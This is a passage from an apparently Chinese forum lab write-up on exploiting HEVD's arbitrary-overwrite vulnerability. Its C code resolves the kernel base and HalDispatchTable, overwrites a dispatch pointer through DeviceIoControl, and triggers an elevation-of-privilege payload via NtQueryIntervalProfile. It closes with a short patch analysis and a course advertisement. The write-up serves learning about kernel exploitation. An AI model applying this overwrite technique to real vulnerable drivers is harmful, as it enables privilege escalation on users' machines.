
首先，定义写入什么和写入哪里的结构体：

```c
typedef struct _WRITE_WHAT_WHERE {
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;
```

我们需要将`where`指针覆盖到一个安全的地址，先查看`NtQueryIntervalProfile`+0x62，然后查看`KeQueryIntervalProfile`，覆盖指针数组的即可。这个函数在内核中用的很少，所以可以覆盖。

![](https://bbs.kanxue.com/upload/attach/202011/858876_82NTFBBB9WS7M54.png)

# 0x03 漏洞利用

## 获取`ntkrnlpa.exe`基址

```c
NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

// Allocate the Heap chunk
pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);

if (!pSystemModuleInformation) {
    DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
}
NtStatus = NtQuerySystemInformation(SystemModuleInformation, pSystemModuleInformation, ReturnLength, &ReturnLength);

if (NtStatus != STATUS_SUCCESS) {
    DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
}

KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
```

## 获取`HalDispatchTable`地址

```c
// This is still in user mode
HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");
// 用户模式加载 ntokrnl.exe

if (!HalDispatchTable) {
    DEBUG_ERROR("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
} else {
    HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode); // 得到 HapDispatchTable 偏移

    // Here we get the address of HapDispatchTable in Kernel mode
    HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);

    DEBUG_INFO("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
}
```

## 调用

```c
WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE));
HalDispatchTable = GetHalDispatchTable();
WriteWhatWhere->What = (PULONG_PTR)&EopPayload;
WriteWhatWhere->Where = (PULONG_PTR)HalDispatchTablePlus4;
DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, (LPVOID)WriteWhatWhere, sizeof(WRITE_WHAT_WHERE), NULL, 0, &BytesReturned, NULL);
```

## 调用`NtQueryIntervalProfile`

```c
NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");
```

成功！

![](https://bbs.kanxue.com/upload/attach/202011/858876_QU2U4Y75X3TRY7V.gif)

# 0x04 补丁分析

安全版本中，检查了`where`和`what`指针，通过验证可进行指针的操作。

![](https://bbs.kanxue.com/upload/attach/202011/858876_GFVKQVVXPZB73Z2.png)

# 0x05 经验总结

这次的分析过程中碰到了点小困难，最后也算是解决了。中途去看了wjllz师傅的[文章](https://bbs.pediy.com/thread-247281.htm)，了解到很多，边学习边复现。这个涉及的蛮多的，也不算是简单吧。还有就是对于`shellcode`的跳转为什么不是直接跳转呢，而是进入跳转表跳转，emmm 疑惑。。。。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
